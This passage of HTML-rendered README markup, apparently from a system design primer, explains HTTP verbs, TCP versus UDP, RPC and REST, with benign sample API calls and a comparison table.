&lt;li&gt;&lt;a href="https://www.quora.com/What-is-the-difference-between-a-message-queue-and-a-task-queue-Why-would-a-task-queue-require-a-message-broker-like-RabbitMQ-Redis-Celery-or-IronMQ-to-function" rel="nofollow"&gt;What is the difference between a message queue and a task queue?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-communication" class="anchor" aria-hidden="true" href="#communication"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Communication&lt;/h2&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/1d761d5688d28ce1fb12a0f1c8191bca96eece4c/687474703a2f2f692e696d6775722e636f6d2f354b656f6351732e6a7067"&gt;&lt;img src="https://camo.githubusercontent.com/1d761d5688d28ce1fb12a0f1c8191bca96eece4c/687474703a2f2f692e696d6775722e636f6d2f354b656f6351732e6a7067" data-canonical-src="http://i.imgur.com/5KeocQs.jpg" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="http://www.escotal.com/osilayer.html" rel="nofollow"&gt;Source: OSI 7 layer model&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-hypertext-transfer-protocol-http" class="anchor" aria-hidden="true" href="#hypertext-transfer-protocol-http"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Hypertext transfer protocol (HTTP)&lt;/h3&gt;
&lt;p&gt;HTTP is a method for encoding and transporting data between a client and a server.  It is a request/response protocol: clients issue requests and servers issue responses with relevant content and completion status info about the request.  HTTP is self-contained, allowing requests and responses to flow through many intermediate routers and servers that perform load balancing, caching, encryption, and compression.&lt;/p&gt;
&lt;p&gt;A basic HTTP request consists of a verb (method) and a resource (endpoint).  Below are common HTTP verbs:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Verb&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;th&gt;Idempotent*&lt;/th&gt;
&lt;th&gt;Safe&lt;/th&gt;
&lt;th&gt;Cacheable&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;GET&lt;/td&gt;
&lt;td&gt;Reads a resource&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;Creates a resource or trigger a process that handles data&lt;/td&gt;
&lt;td&gt;No&lt;/td&gt;
&lt;td&gt;No&lt;/td&gt;
&lt;td&gt;Yes if response contains freshness info&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PUT&lt;/td&gt;
&lt;td&gt;Creates or replace a resource&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;No&lt;/td&gt;
&lt;td&gt;No&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PATCH&lt;/td&gt;
&lt;td&gt;Partially updates a resource&lt;/td&gt;
&lt;td&gt;No&lt;/td&gt;
&lt;td&gt;No&lt;/td&gt;
&lt;td&gt;Yes if response contains freshness info&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DELETE&lt;/td&gt;
&lt;td&gt;Deletes a resource&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;No&lt;/td&gt;
&lt;td&gt;No&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;*Can be called many times without different outcomes.&lt;/p&gt;
&lt;p&gt;HTTP is an application layer protocol relying on lower-level protocols such as &lt;strong&gt;TCP&lt;/strong&gt; and &lt;strong&gt;UDP&lt;/strong&gt;.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-sources-and-further-reading-http" class="anchor" aria-hidden="true" href="#sources-and-further-reading-http"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading: HTTP&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.nginx.com/resources/glossary/http/" rel="nofollow"&gt;What is HTTP?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.quora.com/What-is-the-difference-between-HTTP-protocol-and-TCP-protocol" rel="nofollow"&gt;Difference between HTTP and TCP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://laracasts.com/discuss/channels/general-discussion/whats-the-differences-between-put-and-patch?page=1" rel="nofollow"&gt;Difference between PUT and PATCH&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-transmission-control-protocol-tcp" class="anchor" aria-hidden="true" href="#transmission-control-protocol-tcp"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Transmission control protocol (TCP)&lt;/h3&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/821620cf6aa83566f4def561e754e5991480ca8d/687474703a2f2f692e696d6775722e636f6d2f4a6441736476472e6a7067"&gt;&lt;img src="https://camo.githubusercontent.com/821620cf6aa83566f4def561e754e5991480ca8d/687474703a2f2f692e696d6775722e636f6d2f4a6441736476472e6a7067" data-canonical-src="http://i.imgur.com/JdAsdvG.jpg" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="http://www.wildbunny.co.uk/blog/2012/10/09/how-to-make-a-multi-player-game-part-1/" rel="nofollow"&gt;Source: How to make a multiplayer game&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;p&gt;TCP is a connection-oriented protocol over an &lt;a href="https://en.wikipedia.org/wiki/Internet_Protocol" rel="nofollow"&gt;IP network&lt;/a&gt;.  Connection is established and terminated using a &lt;a href="https://en.wikipedia.org/wiki/Handshaking" rel="nofollow"&gt;handshake&lt;/a&gt;.  All packets sent are guaranteed to reach the destination in the original order and without corruption through:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Sequence numbers and &lt;a href="https://en.wikipedia.org/wiki/Transmission_Control_Protocol#Checksum_computation" rel="nofollow"&gt;checksum fields&lt;/a&gt; for each packet&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Acknowledgement_(data_networks)" rel="nofollow"&gt;Acknowledgement&lt;/a&gt; packets and automatic retransmission&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If the sender does not receive a correct response, it will resend the packets.  If there are multiple timeouts, the connection is dropped.  TCP also implements &lt;a href="https://en.wikipedia.org/wiki/Flow_control_(data)" rel="nofollow"&gt;flow control&lt;/a&gt; and &lt;a href="https://en.wikipedia.org/wiki/Network_congestion#Congestion_control" rel="nofollow"&gt;congestion control&lt;/a&gt;.  These guarantees cause delays and generally result in less efficient transmission than UDP.&lt;/p&gt;
&lt;p&gt;To ensure high throughput, web servers can keep a large number of TCP connections open, resulting in high memory usage.  It can be expensive to have a large number of open connections between web server threads and say, a &lt;a href="https://memcached.org/" rel="nofollow"&gt;memcached&lt;/a&gt; server.  &lt;a href="https://en.wikipedia.org/wiki/Connection_pool" rel="nofollow"&gt;Connection pooling&lt;/a&gt; can help in addition to switching to UDP where applicable.&lt;/p&gt;
&lt;p&gt;TCP is useful for applications that require high reliability but are less time critical.  Some examples include web servers, database info, SMTP, FTP, and SSH.&lt;/p&gt;
&lt;p&gt;Use TCP over UDP when:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;You need all of the data to arrive intact&lt;/li&gt;
&lt;li&gt;You want to automatically make a best estimate use of the network throughput&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-user-datagram-protocol-udp" class="anchor" aria-hidden="true" href="#user-datagram-protocol-udp"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;User datagram protocol (UDP)&lt;/h3&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/47eb14c0a2dff2166f8781a6ce8c7f33d4c33da8/687474703a2f2f692e696d6775722e636f6d2f797a44724a74412e6a7067"&gt;&lt;img src="https://camo.githubusercontent.com/47eb14c0a2dff2166f8781a6ce8c7f33d4c33da8/687474703a2f2f692e696d6775722e636f6d2f797a44724a74412e6a7067" data-canonical-src="http://i.imgur.com/yzDrJtA.jpg" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="http://www.wildbunny.co.uk/blog/2012/10/09/how-to-make-a-multi-player-game-part-1/" rel="nofollow"&gt;Source: How to make a multiplayer game&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;p&gt;UDP is connectionless.  Datagrams (analogous to packets) are guaranteed only at the datagram level.  Datagrams might reach their destination out of order or not at all.  UDP does not support congestion control.  Without the guarantees that TCP support, UDP is generally more efficient.&lt;/p&gt;
&lt;p&gt;UDP can broadcast, sending datagrams to all devices on the subnet.  This is useful with &lt;a href="https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol" rel="nofollow"&gt;DHCP&lt;/a&gt; because the client has not yet received an IP address, thus preventing a way for TCP to stream without the IP address.&lt;/p&gt;
&lt;p&gt;UDP is less reliable but works well in real time use cases such as VoIP, video chat, streaming, and realtime multiplayer games.&lt;/p&gt;
&lt;p&gt;Use UDP over TCP when:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;You need the lowest latency&lt;/li&gt;
&lt;li&gt;Late data is worse than loss of data&lt;/li&gt;
&lt;li&gt;You want to implement your own error correction&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-sources-and-further-reading-tcp-and-udp" class="anchor" aria-hidden="true" href="#sources-and-further-reading-tcp-and-udp"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading: TCP and UDP&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://gafferongames.com/networking-for-game-programmers/udp-vs-tcp/" rel="nofollow"&gt;Networking for game programming&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cyberciti.biz/faq/key-differences-between-tcp-and-udp-protocols/" rel="nofollow"&gt;Key differences between TCP and UDP protocols&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/5970383/difference-between-tcp-and-udp" rel="nofollow"&gt;Difference between TCP and UDP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Transmission_Control_Protocol" rel="nofollow"&gt;Transmission control protocol&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/User_Datagram_Protocol" rel="nofollow"&gt;User datagram protocol&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cs.bu.edu/~jappavoo/jappavoo.github.com/451/papers/memcache-fb.pdf" rel="nofollow"&gt;Scaling memcache at Facebook&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-remote-procedure-call-rpc" class="anchor" aria-hidden="true" href="#remote-procedure-call-rpc"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Remote procedure call (RPC)&lt;/h3&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/1a3d7771c0b0a7816d0533fffeb6eeeb442d9945/687474703a2f2f692e696d6775722e636f6d2f6946344d6b62352e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/1a3d7771c0b0a7816d0533fffeb6eeeb442d9945/687474703a2f2f692e696d6775722e636f6d2f6946344d6b62352e706e67" data-canonical-src="http://i.imgur.com/iF4Mkb5.png" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="http://www.puncsky.com/blog/2016-02-13-crack-the-system-design-interview" rel="nofollow"&gt;Source: Crack the system design interview&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;p&gt;In an RPC, a client causes a procedure to execute on a different address space, usually a remote server.  The procedure is coded as if it were a local procedure call, abstracting away the details of how to communicate with the server from the client program.  Remote calls are usually slower and less reliable than local calls so it is helpful to distinguish RPC calls from local calls.  Popular RPC frameworks include &lt;a href="https://developers.google.com/protocol-buffers/" rel="nofollow"&gt;Protobuf&lt;/a&gt;, &lt;a href="https://thrift.apache.org/" rel="nofollow"&gt;Thrift&lt;/a&gt;, and &lt;a href="https://avro.apache.org/docs/current/" rel="nofollow"&gt;Avro&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;RPC is a request-response protocol:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Client program&lt;/strong&gt; - Calls the client stub procedure.  The parameters are pushed onto the stack like a local procedure call.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Client stub procedure&lt;/strong&gt; - Marshals (packs) procedure id and arguments into a request message.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Client communication module&lt;/strong&gt; - OS sends the message from the client to the server.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Server communication module&lt;/strong&gt; - OS passes the incoming packets to the server stub procedure.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Server stub procedure&lt;/strong&gt; -  Unmarshalls the results, calls the server procedure matching the procedure id and passes the given arguments.&lt;/li&gt;
&lt;li&gt;The server response repeats the steps above in reverse order.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Sample RPC calls:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET /someoperation?data=anId

POST /anotheroperation
{
  "data":"anId";
  "anotherdata": "another value"
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;RPC is focused on exposing behaviors.  RPCs are often used for performance reasons with internal communications, as you can hand-craft native calls to better fit your use cases.&lt;/p&gt;
&lt;p&gt;Choose a native library (aka SDK) when:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;You know your target platform.&lt;/li&gt;
&lt;li&gt;You want to control how your "logic" is accessed.&lt;/li&gt;
&lt;li&gt;You want to control how error control happens off your library.&lt;/li&gt;
&lt;li&gt;Performance and end user experience is your primary concern.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;HTTP APIs following &lt;strong&gt;REST&lt;/strong&gt; tend to be used more often for public APIs.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-disadvantages-rpc" class="anchor" aria-hidden="true" href="#disadvantages-rpc"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disadvantage(s): RPC&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;RPC clients become tightly coupled to the service implementation.&lt;/li&gt;
&lt;li&gt;A new API must be defined for every new operation or use case.&lt;/li&gt;
&lt;li&gt;It can be difficult to debug RPC.&lt;/li&gt;
&lt;li&gt;You might not be able to leverage existing technologies out of the box.  For example, it might require additional effort to ensure &lt;a href="http://etherealbits.com/2012/12/debunking-the-myths-of-rpc-rest/" rel="nofollow"&gt;RPC calls are properly cached&lt;/a&gt; on caching servers such as &lt;a href="http://www.squid-cache.org/" rel="nofollow"&gt;Squid&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-representational-state-transfer-rest" class="anchor" aria-hidden="true" href="#representational-state-transfer-rest"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Representational state transfer (REST)&lt;/h3&gt;
&lt;p&gt;REST is an architectural style enforcing a client/server model where the client acts on a set of resources managed by the server.  The server provides a representation of resources and actions that can either manipulate or get a new representation of resources.  All communication must be stateless and cacheable.&lt;/p&gt;
&lt;p&gt;There are four qualities of a RESTful interface:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Identify resources (URI in HTTP)&lt;/strong&gt; - use the same URI regardless of any operation.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Change with representations (Verbs in HTTP)&lt;/strong&gt; - use verbs, headers, and body.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Self-descriptive error message (status response in HTTP)&lt;/strong&gt; - Use status codes, don't reinvent the wheel.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href="http://restcookbook.com/Basics/hateoas/" rel="nofollow"&gt;HATEOAS&lt;/a&gt; (HTML interface for HTTP)&lt;/strong&gt; - your web service should be fully accessible in a browser.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Sample REST calls:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET /someresources/anId

PUT /someresources/anId
{"anotherdata": "another value"}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;REST is focused on exposing data.  It minimizes the coupling between client/server and is often used for public HTTP APIs.  REST uses a more generic and uniform method of exposing resources through URIs, &lt;a href="https://github.com/for-GET/know-your-http-well/blob/master/headers.md"&gt;representation through headers&lt;/a&gt;, and actions through verbs such as GET, POST, PUT, DELETE, and PATCH.  Being stateless, REST is great for horizontal scaling and partitioning.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-disadvantages-rest" class="anchor" aria-hidden="true" href="#disadvantages-rest"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disadvantage(s): REST&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;With REST being focused on exposing data, it might not be a good fit if resources are not naturally organized or accessed in a simple hierarchy.  For example, returning all updated records from the past hour matching a particular set of events is not easily expressed as a path.  With REST, it is likely to be implemented with a combination of URI path, query parameters, and possibly the request body.&lt;/li&gt;
&lt;li&gt;REST typically relies on a few verbs (GET, POST, PUT, DELETE, and PATCH) which sometimes doesn't fit your use case.  For example, moving expired documents to the archive folder might not cleanly fit within these verbs.&lt;/li&gt;
&lt;li&gt;Fetching complicated resources with nested hierarchies requires multiple round trips between the client and server to render single views, e.g. fetching content of a blog entry and the comments on that entry. For mobile applications operating in variable network conditions, these multiple roundtrips are highly undesirable.&lt;/li&gt;
&lt;li&gt;Over time, more fields might be added to an API response and older clients will receive all new data fields, even those that they do not need, as a result, it bloats the payload size and leads to larger latencies.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-rpc-and-rest-calls-comparison" class="anchor" aria-hidden="true" href="#rpc-and-rest-calls-comparison"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;RPC and REST calls comparison&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Operation&lt;/th&gt;
&lt;th&gt;RPC&lt;/th&gt;
&lt;th&gt;REST&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Signup&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;POST&lt;/strong&gt; /signup&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;POST&lt;/strong&gt; /persons&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Resign&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;POST&lt;/strong&gt; /resign&lt;br&gt;{&lt;br&gt;"personid": "1234"&lt;br&gt;}&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;DELETE&lt;/strong&gt; /persons/1234&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Read a person&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;GET&lt;/strong&gt; /readPerson?personid=1234&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;GET&lt;/strong&gt; /persons/1234&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Read a person’s items list&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;GET&lt;/strong&gt; /readUsersItemsList?personid=1234&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;GET&lt;/strong&gt; /persons/1234/items&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Add an item to a person’s items&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;POST&lt;/strong&gt; /addItemToUsersItemsList&lt;br&gt;{&lt;br&gt;"personid": "1234";&lt;br&gt;"itemid": "456"&lt;br&gt;}&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;POST&lt;/strong&gt; /persons/1234/items&lt;br&gt;{&lt;br&gt;"itemid": "456"&lt;br&gt;}&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Update an item&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;POST&lt;/strong&gt; /modifyItem&lt;br&gt;{&lt;br&gt;"itemid": "456";&lt;br&gt;"key": "value"&lt;br&gt;}&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;PUT&lt;/strong&gt; /items/456&lt;br&gt;{&lt;br&gt;"key": "value"&lt;br&gt;}&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Delete an item&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;POST&lt;/strong&gt; /removeItem&lt;br&gt;{&lt;br&gt;"itemid": "456"&lt;br&gt;}&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;DELETE&lt;/strong&gt; /items/456&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p align="center"&gt;
